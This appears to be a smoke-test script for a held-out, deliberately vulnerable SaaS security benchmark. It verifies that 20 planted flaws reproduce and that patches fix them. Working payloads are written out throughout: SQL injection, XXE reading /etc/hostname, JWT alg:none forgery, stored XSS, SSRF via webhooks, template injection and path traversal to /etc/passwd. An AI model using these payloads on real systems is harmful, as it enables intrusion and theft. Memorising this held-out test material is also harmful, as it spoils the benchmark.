// Smoke / self-verification for the held-out SaaS lab. Run: `node smoke.mjs` (from this directory).
//  - vulnerable build: all 20 planted vulns reproduce, all 6 decoys stay clean
//  - patched build  : every vuln flips reproduced -> fixed, health + benign flows still work
import { createServer } from 'node:http'
import { readFileSync } from 'node:fs'
import { startHeldOutSaasServer, loadHeldOutSaasManifest, heldOutSaasPatchIds } from './server.mjs'

const manifest = loadHeldOutSaasManifest()
const mk = id => manifest.challenges.find(c => c.id === id)?.flagMarker

// ---- loopback canary listener (stand-in for Guardian's CanaryBroker) --------------------------------------------
const hits = []
const canary = createServer((req, res) => {
  hits.push(req.url)
  res.writeHead(200, { 'content-type': 'text/plain' }).end('guardian-canary-ok')
})
await new Promise(r => canary.listen(0, '127.0.0.1', r))
const canaryBase = `http://127.0.0.1:${canary.address().port}`
const canaryUrl = tag => `${canaryBase}/c/guardian-canary-${tag}${Math.random().toString(16).slice(2, 14).padEnd(12, '0')}`
const hitCount = () => hits.length

const b64 = o => Buffer.from(JSON.stringify(o)).toString('base64url')
const sleep = ms => new Promise(r => setTimeout(r, ms))

async function run(patchedIds) {
  const lab = await startHeldOutSaasServer({ patchedIds })
  const tok = handle => lab.personas.find(p => p.handle === handle).secret
  const call = async (path, { method = 'GET', persona, headers = {}, json, body, token } = {}) => {
    const h = { ...headers }
    const bearer = token ?? (persona ? tok(persona) : undefined)
    if (bearer) h.authorization = `Bearer ${bearer}`
    let payload = body
    if (json !== undefined) {
      payload = JSON.stringify(json)
      h['content-type'] = 'application/json'
    }
    const t0 = performance.now()
    const r = await fetch(lab.origin + path, { method, headers: h, body: payload, redirect: 'manual' })
    const text = await r.text()
    let parsed = null
    try { parsed = JSON.parse(text) } catch { /* not json */ }
    return { status: r.status, text, json: parsed, headers: r.headers, ms: performance.now() - t0 }
  }
  const tweakToken = (token, mutate) => {
    const [h, p, s] = token.split('.')
    return mutate({ h: JSON.parse(Buffer.from(h, 'base64url')), p: JSON.parse(Buffer.from(p, 'base64url')), s, raw: [h, p, s] })
  }
  const form = async (path, fields, cookie) => call(path, { method: 'POST', persona: 'persona_a', headers: { 'content-type': 'application/x-www-form-urlencoded', cookie }, body: new URLSearchParams(fields).toString() })
  const csrf = async () => {
    const r = await call('/app/members', { persona: 'persona_a' })
    const cookie = /csrf_token=([a-f0-9]+)/.exec(r.headers.get('set-cookie') ?? '')?.[1]
    const field = /name="_csrf" value="([a-f0-9]+)"/.exec(r.text)?.[1]
    return { cookie: `csrf_token=${cookie}`, field }
  }
  const countOrders = async ref => (await call(`/api/v1/sales-orders?ref=${encodeURIComponent(ref)}`, { persona: 'persona_a' })).json?.orders?.length ?? -1
  const countGqlProducts = async sku => (await call('/graphql', { method: 'POST', persona: 'persona_a', json: { query: 'query($sku:String){ products(sku:$sku){ id sku name price } }', variables: { sku } } })).json?.data?.products?.length ?? -1

  const exploits = {
    'hos-01': async () => {
      const r = await call('/api/v1/invoices/2001', { persona: 'persona_a' })
      return r.status === 200 && r.text.includes(mk('hos-01'))
    },
    'hos-02': async () => {
      const r = await call('/graphql', { method: 'POST', persona: 'persona_a', json: { query: 'query($id:ID!){ user(id:$id){ id invoices { id memo } } }', variables: { id: 'u_globex_1' } } })
      return r.text.includes(mk('hos-02'))
    },
    'hos-03': async () => {
      await call('/api/v1/admin/feature-flags', { method: 'POST', persona: 'viewer', json: { flag: 'smoke_probe', enabled: true } })
      const r = await call('/api/v1/admin/feature-flags', { persona: 'admin' })
      return r.json?.flags?.smoke_probe === true
    },
    'hos-04': async () => {
      await call('/api/v1/profile', { method: 'PATCH', persona: 'persona_a', json: { role: 'admin', creditLimit: 999999 } })
      const r = await call('/api/v1/profile', { persona: 'persona_a' })
      return r.json?.role === 'admin' && r.text.includes(mk('hos-04'))
    },
    'hos-05': async () => {
      const plan = `gn-${Math.random().toString(16).slice(2, 8)}`
      await call('/_actions/updateOrgPlan', { method: 'POST', headers: { 'next-action': '40b7c2e91d3a5f6081c4d2e7a9b0f3c5d61e8a7b2c' }, json: ['globex', plan] })
      const org = await call('/api/v1/org', { persona: 'persona_b' })
      return org.json?.plan === plan
    },
    'hos-06': async () => {
      const [base, t, f] = [await countOrders('1'), await countOrders("1' AND 7777=7777-- -"), await countOrders("1' AND 7777=7778-- -")]
      return base === 1 && t === 1 && f === 0
    },
    'hos-07': async () => {
      const { cookie, field } = await csrf()
      const noCsrf = await form('/app/members/search', { member_id: '1' }, cookie)
      if (noCsrf.status !== 403) return false
      const q = async v => (await form('/app/members/search', { _csrf: field, member_id: v }, cookie)).text.includes('id="members"')
      return (await q('1')) && (await q("1' AND 7777=7777-- -")) && !(await q("1' AND 7777=7778-- -"))
    },
    'hos-08': async () => {
      const sql = n => ({ filter: { name: `signup' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${n}))))-- -` } })
      const base = await call('/api/v1/analytics/query', { method: 'POST', persona: 'persona_a', json: { filter: { name: 'signup' } } })
      const slow = await call('/api/v1/analytics/query', { method: 'POST', persona: 'persona_a', json: sql(50_000_000) })
      return slow.status === 200 && slow.text === base.text && slow.ms - base.ms >= 1700
    },
    'hos-09': async () => {
      const [base, t, f] = [await countGqlProducts('1'), await countGqlProducts("1' AND 7777=7777-- -"), await countGqlProducts("1' AND 7777=7778-- -")]
      return base === 1 && t === 1 && f === 0
    },
    'hos-10': async () => {
      const before = hitCount()
      const url = canaryUrl('xxe')
      const inline = await call('/api/v1/import/xml', { method: 'POST', headers: { 'content-type': 'application/xml' }, body: '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/hostname">]><catalog><item>&x;</item></catalog>' })
      await call('/api/v1/import/xml', { method: 'POST', headers: { 'content-type': 'application/xml' }, body: `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY % d SYSTEM "${url}"> %d;]><catalog><item>a</item></catalog>` })
      return inline.text.includes(mk('hos-10')) && hitCount() > before
    },
    'hos-11': async () => {
      const tampered = tweakToken(tok('persona_a'), ({ h, p, s }) => `${b64(h)}.${b64({ ...p, role: 'admin' })}.${s}`)
      const none = tweakToken(tok('persona_a'), ({ p }) => `${b64({ alg: 'none', typ: 'JWT' })}.${b64(p)}.`)
      const stripped = tweakToken(tok('persona_a'), ({ raw }) => `${raw[0]}.${raw[1]}.`)
      const swapped = tweakToken(tok('persona_a'), ({ p }) => `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ ...p, role: 'admin' })}.`)
      const s = async t => (await call('/api/v1/session', { token: t })).status
      const swappedBody = await call('/api/v1/session', { token: swapped })
      return (await s(tok('persona_a'))) === 200 && (await s(tampered)) === 401 && (await s(none)) === 200 && (await s(stripped)) === 200 && swappedBody.text.includes(mk('hos-11'))
    },
    'hos-12': async () => {
      const before = hitCount()
      const jku = tweakToken(tok('persona_a'), ({ h, p, s }) => `${b64({ ...h, jku: canaryUrl('jku') })}.${b64(p)}.${s}`)
      const ctl = await call('/api/v1/partner/ledger', { persona: 'persona_a' })
      await call('/api/v1/partner/ledger', { token: jku })
      return ctl.status === 200 && hitCount() > before
    },
    'hos-13': async () => {
      const o = await call('/api/v1/checkout/orders', { method: 'POST', persona: 'persona_a', json: { sku: '2', qty: 1 } })
      const c = await call(`/api/v1/checkout/orders/${o.json.id}/confirm`, { method: 'POST', persona: 'persona_a', json: {} })
      return c.status === 200 && c.json?.status === 'confirmed' && c.json?.paid === false && c.text.includes(mk('hos-13'))
    },
    'hos-14': async () => {
      const start = (await call('/api/v1/credits', { persona: 'persona_a' })).json.balance
      const v = (await call('/api/v1/credits/vouchers', { method: 'POST', persona: 'persona_a', json: {} })).json
      await Promise.all(Array.from({ length: 6 }, () => call('/api/v1/credits/redeem', { method: 'POST', persona: 'persona_a', json: { code: v.code } })))
      const end = (await call('/api/v1/credits', { persona: 'persona_a' })).json.balance
      return end > start + v.value
    },
    'hos-15': async () => {
      const payload = `<img src=x onerror=alert(${Math.floor(Math.random() * 1e6)})>`
      await call('/api/v1/comments', { method: 'POST', persona: 'persona_a', json: { projectId: 'p_acme_1', body: payload } })
      const page = await call('/app/projects/p_acme_1/activity', { persona: 'admin' })
      return page.text.includes(payload)
    },
    'hos-16': async () => {
      const before = hitCount()
      const hook = await call('/api/v1/webhooks', { method: 'POST', persona: 'persona_a', json: { url: canaryUrl('ssrf'), event: 'order.confirmed' } })
      if (hook.status !== 201) return false
      await call(`/api/v1/webhooks/${hook.json.id}/ping`, { method: 'POST', persona: 'persona_a', json: {} })
      const internal = await call('/api/v1/webhooks', { method: 'POST', persona: 'persona_a', json: { url: `${lab.origin}/internal/webhook-sink` } })
      const ping = await call(`/api/v1/webhooks/${internal.json.id}/ping`, { method: 'POST', persona: 'persona_a', json: {} })
      return hitCount() > before && ping.text.includes(mk('hos-16'))
    },
    'hos-17': async () => {
      const gcb = crypto.randomUUID()
      const ctl = await call(`/app/account/x.css?_gcb=${crypto.randomUUID()}`)
      await call(`/app/account/x.css?_gcb=${gcb}`, { persona: 'persona_a' })
      const verify = await call(`/app/account/x.css?_gcb=${gcb}`)
      return ctl.status === 401 && verify.status === 200 && /hit/i.test(verify.headers.get('x-cache') ?? '') && verify.text.includes(mk('hos-17'))
    },
    'hos-18': async () => (await call('/static/search.js')).text.includes('innerHTML'),
    'hos-19': async () => {
      const r = await call('/api/v1/notifications/preview', { method: 'POST', persona: 'persona_a', json: { template: 'v={{7*191}} w=${13*101} s={{deployToken}}' } })
      return r.json?.rendered === `v=1337 w=1313 s=${mk('hos-19')}`
    },
    'hos-20': async () => {
      const r = await call(`/api/v1/exports/download?file=${encodeURIComponent('../../etc/passwd')}`, { persona: 'persona_a' })
      return r.status === 200 && r.text.includes('root:x:0:0') && r.text.includes(mk('hos-20'))
    },
  }

  // Decoys: each returns true when the decoy is (wrongly) exploitable. Expected: always false.
  const decoyExploits = {
    'hos-d1': async () => {
      const q = async v => (await call(`/api/v1/catalog/search?q=${encodeURIComponent(v)}`, { persona: 'persona_a' })).json?.count
      const t0 = performance.now()
      await q("1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))-- -")
      return (await q("1' AND 7777=7777-- -")) !== (await q("1' AND 7777=7778-- -")) || performance.now() - t0 > 1500
    },
    'hos-d2': async () => (await call('/api/v2/invoices/2001', { persona: 'persona_a' })).status === 200,
    'hos-d3': async () => {
      const payload = `<img src=x onerror=alert(${Math.floor(Math.random() * 1e6)})>`
      await call('/api/v1/notes', { method: 'POST', persona: 'persona_a', json: { projectId: 'p_acme_1', body: payload } })
      return (await call('/app/projects/p_acme_1/notes', { persona: 'admin' })).text.includes(payload)
    },
    'hos-d4': async () => {
      const before = hitCount()
      const none = tweakToken(tok('persona_a'), ({ p }) => `${b64({ alg: 'none', typ: 'JWT' })}.${b64(p)}.`)
      const stripped = tweakToken(tok('persona_a'), ({ raw }) => `${raw[0]}.${raw[1]}.`)
      const jku = tweakToken(tok('persona_a'), ({ h, p, s }) => `${b64({ ...h, jku: canaryUrl('d4') })}.${b64(p)}.${s}`)
      const ok = (await call('/api/v2/session', { persona: 'persona_a' })).status === 200
      const statuses = await Promise.all([none, stripped, jku].map(async t => (await call('/api/v2/session', { token: t })).status))
      return !ok || statuses.includes(200) || hitCount() > before
    },
    'hos-d5': async () => {
      const before = hitCount()
      const r = await call('/api/v1/import/xml/strict', { method: 'POST', headers: { 'content-type': 'application/xml' }, body: `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/hostname"><!ENTITY y SYSTEM "${canaryUrl('d5')}">]><catalog><item>&x;&y;</item></catalog>` })
      const clean = await call('/api/v1/import/xml/strict', { method: 'POST', headers: { 'content-type': 'application/xml' }, body: '<?xml version="1.0"?><catalog><item>ok</item></catalog>' })
      return r.status === 200 || r.text.includes(mk('hos-10')) || hitCount() > before || clean.status !== 200
    },
    'hos-d6': async () => {
      const gcb = crypto.randomUUID()
      const ctl = await call(`/public/catalog/plans.css?_gcb=${crypto.randomUUID()}`)
      const probe = await call(`/public/catalog/plans.css?_gcb=${gcb}`, { persona: 'persona_a' })
      const verify = await call(`/public/catalog/plans.css?_gcb=${gcb}`)
      const personalData = [probe.text, verify.text].some(t => /alice|acme|HOSFLAG/i.test(t))
      return personalData || verify.text !== ctl.text
    },
  }

  const out = { vuln: {}, decoy: {}, health: null, benign: null }
  for (const [id, fn] of Object.entries(exploits)) {
    try { out.vuln[id] = Boolean(await fn()) } catch (err) { out.vuln[id] = `error: ${err.message}` }
    lab.resetState()
  }
  for (const [id, fn] of Object.entries(decoyExploits)) {
    try { out.decoy[id] = Boolean(await fn()) } catch (err) { out.decoy[id] = `error: ${err.message}` }
    lab.resetState()
  }
  out.health = (await call('/health')).status
  const [inv, list, ord] = await Promise.all([
    call('/api/v1/invoices/1001', { persona: 'persona_a' }),
    call('/api/v1/invoices', { persona: 'persona_b' }),
    call('/api/v1/sales-orders?ref=1', { persona: 'persona_a' }),
  ])
  const gql = await call('/graphql', { method: 'POST', persona: 'persona_a', json: { query: '{ __schema { queryType { name } types { name } } me { id name } }' } })
  const surface = await Promise.all(['/', '/robots.txt', '/sitemap.xml', '/openapi.json', '/app.js', '/.well-known/jwks.json'].map(p => call(p)))
  out.benign = inv.status === 200 && list.json?.invoices?.length === 2 && ord.json?.orders?.length === 1 && gql.json?.data?.me?.id === 'u_acme_1' && surface.every(s => s.status === 200)
  await lab.close()
  return out
}

let failed = 0
const expect = (cond, msg) => {
  if (!cond) {
    failed += 1
    console.log(`  FAIL: ${msg}`)
  }
}

console.log('== vulnerable build (no patches) ==')
const vulnerable = await run([])
for (const [id, v] of Object.entries(vulnerable.vuln)) expect(v === true, `${id} should reproduce (got ${v})`)
for (const [id, v] of Object.entries(vulnerable.decoy)) expect(v === false, `decoy ${id} must stay clean (got ${v})`)
expect(vulnerable.health === 200 && vulnerable.benign === true, 'health + benign flows on vulnerable build')
console.log(`  reproduced ${Object.values(vulnerable.vuln).filter(v => v === true).length}/20, decoy false-positives ${Object.values(vulnerable.decoy).filter(v => v !== false).length}/6`)

console.log('== fully patched build ==')
const patched = await run(heldOutSaasPatchIds)
for (const [id, v] of Object.entries(patched.vuln)) expect(v === false, `${id} should be fixed (got ${v})`)
for (const [id, v] of Object.entries(patched.decoy)) expect(v === false, `decoy ${id} must stay clean when patched (got ${v})`)
expect(patched.health === 200 && patched.benign === true, 'health + benign flows on patched build')
console.log(`  fixed ${Object.values(patched.vuln).filter(v => v === false).length}/20`)

console.log('== per-patch isolation (each patch fixes exactly its own vuln) ==')
let isolated = 0
for (const id of heldOutSaasPatchIds) {
  const r = await run([id])
  const others = Object.entries(r.vuln).filter(([k, v]) => k !== id && v !== true)
  expect(r.vuln[id] === false && others.length === 0, `patch ${id}: target=${r.vuln[id]} regressions=${others.map(o => o[0]).join(',') || 'none'}`)
  if (r.vuln[id] === false && others.length === 0) isolated += 1
}
console.log(`  isolated patches ${isolated}/20`)

// patch files must flip the matching switch
for (const id of heldOutSaasPatchIds) {
  const diff = readFileSync(new URL(`./patches/${id}.patch`, import.meta.url), 'utf8')
  expect(diff.includes(`-  '${id}': false,`) && diff.includes(`+  '${id}': true,`), `patches/${id}.patch content`)
}

canary.close()
console.log(failed === 0 ? 'SMOKE OK' : `SMOKE FAILED (${failed})`)
process.exit(failed === 0 ? 0 : 1)
